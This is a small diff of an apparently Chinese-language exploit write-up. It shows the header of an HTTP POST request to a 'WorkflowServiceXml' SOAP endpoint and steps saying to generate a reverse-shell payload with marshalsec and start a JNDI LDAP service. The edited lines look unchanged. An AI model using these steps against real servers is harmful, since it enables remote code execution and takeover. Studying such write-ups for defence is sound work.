@@ -62,7 +62,7 @@ Connection: close
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BhFTExcW4CWW6p5OFp5vKFAMPUMfqXdqOlayXjZV39qt9uvp4ib6nqSw/640?wx_fmt=png)
 
 ```
-POST /services%20/WorkflowServiceXml HTTP/1.1
+POST /services%20/WorkflowServiceXml HTTP/1.1
 Accept-Encoding: gzip, deflate
 Content-Type: text/xml;charset=UTF-8
 SOAPAction: ""
@@ -91,7 +91,7 @@ Connection: close
 
 或者直接：  
 
-利用 marshalsec 生成反弹 shell  payload
+利用 marshalsec 生成反弹 shell  payload
 
 启动 jndi ：ldap 服务
 
